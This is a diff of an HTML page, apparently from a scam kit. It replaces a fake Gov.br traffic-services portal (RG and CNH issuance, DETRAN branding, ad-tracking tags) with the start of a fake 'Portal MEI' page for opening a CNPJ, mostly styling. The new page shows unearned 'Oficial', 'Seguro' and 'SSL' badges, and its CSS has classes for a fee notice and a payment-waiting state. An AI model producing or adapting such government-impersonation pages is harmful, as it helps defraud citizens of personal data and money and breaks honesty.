@@ -1,216 +1,1468 @@
-
-<!DOCTYPE html><html lang="pt-BR">
+<!DOCTYPE html>
+<html lang="pt-BR">
 <head>
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CYPSPHG7"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'G-CYPSPHG7VD');
-  </script>
-  
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-169817808"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'AW-16981780854');
-  </script>
-  
-  <title>Portal de Serviços de Trânsito | Gov.br</title>
-  <meta name="description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH) disponível nos modelos cédula em papel moeda e cartão de policarbonato.">
-  <meta name="keywords" content="rg, cnh, segunda via, tirar documento">
-  <meta name="author" content="Gov.br">
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#FFFFFF">
-  <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
-  <meta name="msapplication-navbutton-color" content="#FFFFFF">
-  
-  <!-- Open Graph -->
-  <meta property="og:title" content="Portal de Serviços de Trânsito | Gov.br">
-  <meta property="og:description" content="Emissão da 1a ou 2a via da Carteira de Identidade (RG), Carteira Nacional de Habilitação (CNH).">
-  <meta property="og:url" content="#">
-  <meta property="og:type" content="website">
-  <meta property="og:image" content="images/brasao.png">
-  
-  <!-- Favicons -->
-  <link rel="shortcut icon" href="images/favicon.png">
-  <link rel="icon" href="images/favicon.png" sizes="32x32">
-  <link rel="icon" href="images/favicon.png" sizes="192x192">
-  <link rel="apple-touch-icon" href="images/favicon.png">
-  <meta name="msapplication-TileImage" content="images/favicon.png">
-  
-  <!-- CSS -->
-  <link href="css/bootstrap.min.css" rel="stylesheet">
-  <!-- Font Awesome CDN - SOLUÇÃO PARA OS ÍCONES -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
-  <link rel="stylesheet" href="css/toastify.min.css">
-  <link href="css/style.css" rel="stylesheet">
-  
-  <!-- Scripts -->
-  <script src="js/lates.js" data-utmify-prevent-subids="" async defer></script>
-  
-  <!-- Seu JavaScript existente -->
-  <script>
-    document.addEventListener("DOMContentLoaded", function() {
-        function salvarParametrosNoLocalStorage() {
-            const params = new URLSearchParams(window.location.search);
-            const googleData = {};
-            googleData.utm_source = 'organic';
-            params.forEach((value, key) => {
-                googleData[key] = value;
-            });
-            localStorage.setItem('google', JSON.stringify(googleData));
-            console.log(googleData);
-        }
-        salvarParametrosNoLocalStorage();
-        
-        const google = JSON.parse(localStorage.getItem('google')) || {};
-        const params = Object.entries(google)
-            .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
-            .join('&');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abertura de CNPJ MEI - Portal Oficial Brasileiro</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <style>
+        :root {
+            /* Paleta de cores profissional e institucional */
+            --primary-color: #1e40af;
+            --primary-hover: #1d4ed8;
+            --primary-light: #dbeafe;
+            --secondary-color: #64748b;
+            --success-color: #059669;
+            --success-light: #d1fae5;
+            --warning-color: #d97706;
+            --warning-light: #fef3c7;
+            --error-color: #dc2626;
+            --error-light: #fee2e2;
             
-        var novaUrl1 = './pagina1/';
-        var novaUrl2 = './pagina2/';
-        var novaUrl3 = './pagina3/';
-        var novaUrl4 = './pagina4/';
-        var novaUrl5 = './pagina5/';
-        
-        document.getElementById('service1').addEventListener('click', function() {
-            window.location.href = novaUrl1;
-        });
-        document.getElementById('service2').addEventListener('click', function() {
-            window.location.href = novaUrl2;
-        });
-        document.getElementById('service3').addEventListener('click', function() {
-            window.location.href = novaUrl3;
-        });
-        document.getElementById('service4').addEventListener('click', function() {
-            window.location.href = novaUrl4;
-        });
-        document.getElementById('service5').addEventListener('click', function() {
-            window.location.href = novaUrl5;
-        });
-    });
-  </script>
-</head>
-  
-<body><header id="site-header">
-    <div class="header-wrapper container">
-        <div class="br-header">
-            <div class="header-top">
-                <div class="header-logo">
-                    <a href="#"><img src="images/logo.png" alt="Logomarca GovBR"></a>
-                </div>
-                <div class="header-actions">
-                    <div class="links-rapidos false svelte-19kdt9x">
-                        <button class="br-button small circle toggle-links-rapidos false svelte-19kdt9x" aria-label="Menu de links"><i class="fas fa-ellipsis-v" aria-hidden="true"></i></button>
-                        <ul class=" links-governo svelte-19kdt9x">
-                            <li class="titulo svelte-19kdt9x">Acesso Rápido</li>
-                            <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Órgãos do Governo</a></li>
-                            <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Acesso à Informaão</a></li>
-                            <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Legislação</a></li>
-                            <li class="svelte-19kdt9x"><a href="#" class="svelte-19kdt9x">Acessibilidade</a></li>
-                        </ul>
-                    </div>
-                    <span class="br-divider vertical mx-half mx-sm-1"></span>
-                    <div class="wrapper svelte-1jznxvb">
-                        <div class="wrapper svelte-18ap8dw">
-                            <div class="button-wrapper svelte-18ap8dw">
-                                <span class="langue-select svelte-18ap8dw"><span class="sr-only">Idioma atual:</span> PT</span>
-                                <button class="br-button circle small false langue-button svelte-18ap8dw" type="button" aria-label="Alterar idioma"><i class="fas fa-angle-down" aria-hidden="true"></i></button>
-                            </div>
-                        </div>
-                        <div class="wrapper svelte-ippqk1">
-                            <div class="button-badge svelte-ippqk1">
-                                <button class="br-button circle small false false cookies svelte-ippqk1" type="button" aria-label="Cookies"><i class="fas fa-cookie-bite svelte-ippqk1" aria-hidden="true"></i></button> 
-                            </div>
-                        </div>
-                        <div class="wrapper svelte-ippqk1">
-                            <div class="button-badge svelte-ippqk1">
-                                <button class="br-button circle small false false contrast-button svelte-ippqk1" type="button" aria-label="Alto contraste"><i class="fas fa-adjust svelte-ippqk1" aria-hidden="true"></i></button>
-                            </div>
-                        </div>
-                        <div class="wrapper svelte-ippqk1">
-                            <div class="button-badge svelte-ippqk1">
-                                <button class="br-button circle small false false slideBarAnonima svelte-ippqk1" type="button" aria-label="Sistemas."><i class="fas fa-th svelte-ippqk1" aria-hidden="true"></i></button>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="wrapper-login">
-                        <div class="header-sign-in">
-                            <div class="cta-wrapper svelte-7keokj">
-                                <button class="br-sign-in primary ml-2 false svelte-7keokj d-none d-lg-block d-xl-block" type="button"><i class="fas fa-user" aria-hidden="true"></i> Entrar com gov.br</button>
-                                <button class="br-sign-in primary ml-2 false svelte-7keokj d-block d-lg-none d-xl-none" type="button"><i class="fas fa-user" aria-hidden="true"></i> Entrar</button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div class="main">
-        <div class="header-wrapper container">
-            <div class="site-name-wrapper">
-                <a class="ico-navegacao toggle-main-navigation" href="javascript:void(0)">
-                    <span class="sr-only">Abrir menu principal de navegação</span>
-                    <span class="fa fa-bars" aria-hidden="true"></span>
-                    <span class="fa fa-times" aria-hidden="true"></span>
-                </a>
-                <div class="site-name">
-                    <a href="javascript:void(0)">Portal de Serviços de Trânsito</a>
-                </div>
-            </div>
-            <div class="govbr-busca-header">
-                <div id="govbr-busca-input">
-                    <div class="aa-Autocomplete" role="combobox" aria-expanded="false" aria-haspopup="listbox" aria-labelledby="searchtext-label">
-                        <form class="aa-Form" action="" novalidate="" role="search"><div class="aa-InputWrapperPrefix"><div class="aa-LoadingIndicator" hidden=""><svg class="aa-LoadingIcon" viewBox="0 0 100 100" width="20" height="20"><circle cx="50" cy="50" fill="none" r="35" stroke="currentColor" stroke-dasharray="164.93361431346415 56.97787143782138" stroke-width="6"><animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;90 50 50;180 50 50;360 50 50" keyTimes="0;0.40;0.65;1"></animateTransform></circle></svg>
-                    </div>
-                    <button class="aa-SubmitButton" type="submit" title="Submit">
-                        <i class="fa-solid fa-magnifying-glass"></i></button>
-                    </div>
-                    <div class="aa-InputWrapper">
-                        <input class="aa-Input" aria-autocomplete="both" aria-labelledby="searchtext-label" id="searchtext-input" autocomplete="off" autocorrect="off" autocapitalize="none" enterkeyhint="search" spellcheck="false" placeholder="O que você procura?" maxlength="512" type="search">
-                    </div>
-                    <div class="aa-InputWrapperSuffix">
-                        <button class="aa-ClearButton" type="reset" title="Clear" hidden=""><svg class="aa-ClearIcon" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M5.293 6.707l5.293 5.293-5.293 5.293c-0.391 0.391-0.391 1.024 0 1.414s1.024 0.391 1.414 0l5.293-5.293 5.293 5.293c0.391 0.391 1.024 0.391 1.414 0s0.391-1.024 0-1.414l-5.293-5.293 5.293-5.293c0.391-0.391 0.391-1.024 0-1.414s-1.024-0.391-1.414 0l-5.293 5.293-5.293-5.293c-0.391-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414z"></path></svg></button>
-                    </div>
-                </form>
-            </div>
-        </div>
-        <button type="button" class="govbr-busca-toggle" aria-label="Fechar busca"><span class="fas fa-search"></span></button>
-    </div>
-            </div>
-        </div>
-</header>
+            /* Tons de cinza profissionais */
+            --gray-50: #f8fafc;
+            --gray-100: #f1f5f9;
+            --gray-200: #e2e8f0;
+            --gray-300: #cbd5e1;
+            --gray-400: #94a3b8;
+            --gray-500: #64748b;
+            --gray-600: #475569;
+            --gray-700: #334155;
+            --gray-800: #1e293b;
+            --gray-900: #0f172a;
+            --white: #ffffff;
+            
+            /* Sombras profissionais */
+            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+            --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 10px 10px -5px rgb(0 0 0 / 0.04);
+            
+            /* Bordas e raios */
+            --border-radius: 8px;
+            --border-radius-lg: 12px;
+            --border-radius-xl: 16px;
+            
+            /* Transições suaves */
+            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-fast: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
+        }
 
-<div id="loading-form">
-    <div class="image">
-        <img src="images/loading.svg" alt="Carregando">
-    </div>
-</div>
-<div id="portal-breadcrumbs-wrapper">
-    <nav id="breadcrumbs" class="container" aria-label="Histórico de navegação (Breadcrumbs)">
-        <div class="content">
-            <span class="sr-only">Voc está aqui:</span>
-            <span class="home">
-                <a href="javascript:void(0)">
-                    <span class="fas fa-home" aria-hidden="true"></span>
-                    <span class="sr-only">Página Inicial</span>
-                </a>
-            </span>
-            <span dir="ltr" id="breadcrumbs-1">
-                <a href="javascript:void(0)">DETRAN</a>
-            </span>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, var(--gray-50) 0%, var(--white) 100%);
+            color: var(--gray-800);
+            line-height: 1.6;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* ===== HEADER PROFISSIONAL COM CREDIBILIDADE ===== */
+        .header {
+            background: var(--white);
+            border-bottom: 1px solid var(--gray-200);
+            box-shadow: var(--shadow-sm);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
+            border-radius: var(--border-radius);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--white);
+            font-size: 20px;
+            box-shadow: var(--shadow-md);
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--gray-900);
+            line-height: 1.2;
+        }
+
+        .logo-subtitle {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--gray-500);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .security-indicators {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--success-light);
+            color: var(--success-color);
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            border: 1px solid var(--success-color);
+        }
+
+        .ssl-indicator {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: var(--gray-600);
+            font-size: 11px;
+            font-weight: 500;
+        }
+
+        .gov-badge {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            background: var(--primary-light);
+            color: var(--primary-color);
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== CONTAINER PRINCIPAL ===== */
+        .main-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px 20px;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 24px;
+        }
+
+        @media (min-width: 1024px) {
+            .main-container {
+                grid-template-columns: 1fr 380px;
+                gap: 32px;
+            }
+        }
+
+        /* ===== PROGRESSO PROFISSIONAL ===== */
+        .progress-section {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 24px;
+            box-shadow: var(--shadow-sm);
+            margin-bottom: 24px;
+        }
+
+        .progress-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .progress-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-900);
+            margin-bottom: 4px;
+        }
+
+        .progress-subtitle {
+            font-size: 13px;
+            color: var(--gray-600);
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            height: 2px;
+            background: var(--gray-200);
+            z-index: 1;
+        }
+
+        .progress-line-active {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary-color), var(--primary-hover));
+            z-index: 2;
+            transition: width 0.5s ease;
+            width: 0%;
+            border-radius: 1px;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 3;
+            flex: 1;
+        }
+
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--white);
+            border: 2px solid var(--gray-300);
+            color: var(--gray-500);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            transition: var(--transition);
+            margin-bottom: 8px;
+        }
+
+        .step.active .step-circle {
+            background: var(--primary-color);
+            border-color: var(--primary-color);
+            color: var(--white);
+            box-shadow: 0 0 0 4px var(--primary-light);
+            transform: scale(1.05);
+        }
+
+        .step.completed .step-circle {
+            background: var(--success-color);
+            border-color: var(--success-color);
+            color: var(--white);
+            transform: scale(1.05);
+        }
+
+        .step-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--gray-600);
+            text-align: center;
+            max-width: 80px;
+        }
+
+        .step.active .step-label {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .step.completed .step-label {
+            color: var(--success-color);
+        }
+
+        /* ===== FORMULÁRIO PRINCIPAL ===== */
+        .form-container {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            box-shadow: var(--shadow-sm);
+            overflow: hidden;
+        }
+
+        .form-header {
+            background: linear-gradient(135deg, var(--gray-50) 0%, var(--white) 100%);
+            border-bottom: 1px solid var(--gray-200);
+            padding: 24px 32px;
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--gray-900);
+            margin-bottom: 6px;
+        }
+
+        .form-subtitle {
+            font-size: 15px;
+            color: var(--gray-600);
+            line-height: 1.5;
+        }
+
+        .form-content {
+            padding: 32px;
+        }
+
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+            animation: fadeInUp 0.3s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== CAMPOS DE FORMULÁRIO PROFISSIONAIS ===== */
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+            margin-bottom: 24px;
+        }
+
+        @media (min-width: 640px) {
+            .form-row {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--gray-700);
+            margin-bottom: 8px;
+        }
+
+        .form-label.required::after {
+            content: ' *';
+            color: var(--error-color);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--gray-300);
+            border-radius: var(--border-radius);
+            font-size: 15px;
+            font-weight: 400;
+            transition: var(--transition-fast);
+            background: var(--white);
+            color: var(--gray-900);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px var(--primary-light);
+        }
+
+        .form-input:hover:not(:focus) {
+            border-color: var(--gray-400);
+        }
+
+        .form-input.error {
+            border-color: var(--error-color);
+            box-shadow: 0 0 0 3px var(--error-light);
+            background: var(--error-light);
+        }
+
+        .form-input.success {
+            border-color: var(--success-color);
+            box-shadow: 0 0 0 3px var(--success-light);
+            background: var(--success-light);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            font-weight: 500;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+            animation: fadeIn 0.2s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* ===== SEÇÕES ESPECIAIS ===== */
+        .info-section {
+            background: var(--gray-50);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin: 24px 0;
+        }
+
+        .info-section-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .info-section-icon {
+            width: 20px;
+            height: 20px;
+            color: var(--primary-color);
+        }
+
+        .info-section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-900);
+        }
+
+        .info-section-content {
+            font-size: 14px;
+            color: var(--gray-700);
+            line-height: 1.5;
+        }
+
+        /* ===== SEÇÃO DE TAXA DE ABERTURA ===== */
+        .fee-notice-section {
+            background: linear-gradient(135deg, var(--primary-light) 0%, rgba(30, 64, 175, 0.05) 100%);
+            border: 2px solid var(--primary-color);
+            border-radius: var(--border-radius-lg);
+            padding: 24px;
+            margin: 24px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .fee-notice-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary-color), var(--primary-hover));
+        }
+
+        .fee-notice-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .fee-notice-icon {
+            width: 24px;
+            height: 24px;
+            color: var(--primary-color);
+            font-size: 20px;
+        }
+
+        .fee-notice-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin: 0;
+        }
+
+        .fee-notice-content {
+            color: var(--gray-700);
+            line-height: 1.6;
+        }
+
+        .fee-notice-text {
+            font-size: 15px;
+            margin-bottom: 16px;
+        }
+
+        .fee-highlight-box {
+            background: var(--white);
+            border: 1px solid var(--primary-color);
+            border-radius: var(--border-radius);
+            padding: 16px;
+            margin: 16px 0;
+            text-align: center;
+        }
+
+        .fee-amount {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 4px;
+        }
+
+        .fee-description {
+            font-size: 14px;
+            color: var(--gray-600);
+            font-weight: 500;
+        }
+
+        .fee-benefits-list {
+            list-style: none;
+            padding: 0;
+            margin: 16px 0 0 0;
+        }
+
+        .fee-benefits-list li {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--gray-700);
+        }
+
+        .fee-benefits-list li::before {
+            content: '✓';
+            color: var(--success-color);
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        /* ===== LOADING INDICATOR ===== */
+        .loading-indicator {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            margin-top: 8px;
+            color: var(--gray-600);
+            font-size: 13px;
+        }
+
+        .loading-indicator.show {
+            display: flex;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid var(--gray-300);
+            border-top: 2px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== BOTÕES PROFISSIONAIS ===== */
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 32px;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            min-width: 140px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
+            color: var(--white);
+            box-shadow: var(--shadow-md);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: var(--gray-100);
+            color: var(--gray-700);
+            border: 1px solid var(--gray-300);
+        }
+
+        .btn-secondary:hover {
+            background: var(--gray-200);
+        }
+
+        .btn-loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        /* ===== CHECKBOX ===== */
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .checkbox-input {
+            width: 20px;
+            height: 20px;
+            margin-top: 2px;
+            cursor: pointer;
+            accent-color: var(--primary-color);
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: var(--gray-700);
+            line-height: 1.5;
+            cursor: pointer;
+        }
+
+        .checkbox-label strong {
+            color: var(--gray-900);
+            font-weight: 600;
+        }
+
+        /* ===== DECLARATION SECTION ===== */
+        .declaration-section {
+            background: var(--gray-50);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 24px;
+            margin: 24px 0;
+        }
+
+        .declaration-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-900);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .declaration-text {
+            font-size: 14px;
+            color: var(--gray-700);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        /* ===== SIDEBAR ===== */
+        .sidebar {
+            display: none;
+        }
+
+        @media (min-width: 1024px) {
+            .sidebar {
+                display: flex;
+                flex-direction: column;
+                gap: 20px;
+            }
+        }
+
+        .summary-card {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 20px;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .summary-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-900);
+            margin-bottom: 16px;
+        }
+
+        .price-display {
+            background: linear-gradient(135deg, var(--primary-light) 0%, rgba(30, 64, 175, 0.05) 100%);
+            border-radius: var(--border-radius);
+            padding: 16px;
+            text-align: center;
+        }
+
+        .price-label {
+            font-size: 12px;
+            color: var(--gray-600);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .price-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary-color);
+        }
+
+        .trust-section {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius-lg);
+            padding: 20px;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .trust-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-900);
+            margin-bottom: 16px;
+        }
+
+        .trust-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            color: var(--gray-700);
+        }
+
+        .trust-icon {
+            width: 20px;
+            height: 20px;
+            background: var(--success-light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--success-color);
+            font-size: 12px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .trust-text {
+            line-height: 1.4;
+        }
+
+        /* ===== LOADING OVERLAY ===== */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(15, 23, 42, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .loading-content {
+            background: var(--white);
+            padding: 32px;
+            border-radius: var(--border-radius-lg);
+            text-align: center;
+            box-shadow: var(--shadow-xl);
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--gray-200);
+            border-top: 3px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        .loading-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-900);
+        }
+
+        /* ===== SUCCESS NOTIFICATION ===== */
+        .success-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--success-color);
+            color: var(--white);
+            padding: 16px 20px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-lg);
+            display: none;
+            z-index: 999;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(100px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        /* ===== CNPJ INFO DISPLAY ===== */
+        .cnpj-info-display {
+            background: var(--success-light);
+            border: 1px solid var(--success-color);
+            border-radius: var(--border-radius-lg);
+            padding: 20px;
+            margin: 24px 0;
+        }
+
+        .cnpj-info-display h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--success-color);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .cnpj-info-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+        }
+
+        @media (min-width: 640px) {
+            .cnpj-info-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        .cnpj-info-item {
+            font-size: 13px;
+            color: var(--gray-700);
+        }
+
+        .cnpj-info-label {
+            font-weight: 600;
+            color: var(--gray-900);
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .cnpj-info-value {
+            color: var(--gray-700);
+        }
+
+        /* ===== WAITING PAYMENT ===== */
+        .waiting-payment {
+            background: var(--warning-light);
+            border: 2px solid var(--warning-color);
+            border-radius: var(--border-radius-lg);
+            padding: 24px;
+            margin: 24px 0;
+            text-align: center;
+        }
+
+        .waiting-payment-icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+        }
+
+        .waiting-payment-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--warning-color);
+        }
+    </style>
+</head>
+<body>
+    <!-- Header Profissional -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-section">
+                <div class="logo-icon">
+                    <i class="fas fa-building"></i>
+                </div>
+                <div class="logo-text">
+                    <div class="logo-title">Portal MEI</div>
+                    <div class="logo-subtitle">Online</div>
+                </div>
+            </div>
+            
+            <div class="security-indicators">
+                <div class="gov-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    Oficial
+                </div>
+                <div class="security-badge">
+                    <i class="fas fa-lock"></i>
+                    Seguro
+                </div>
+                <div class="ssl-indicator">
+                    <i class="fas fa-certificate"></i>
+                    SSL
+                </div>
+            </div>
         </div>
-    </nav>
-</div>
-<section id="inicio">
-    <div class="container">
-        <div class="servicos">
-            <h2>Serviços Disponíveis</h2>
-            <div class="card-servicos">
-                <div class="content-card">
+    </header>
+
+    <!-- Container Principal -->
+    <div class="main-container">
+        <!-- Conteúdo Principal -->
+        <main class="main-content">
+            <!-- Seção de Progresso -->
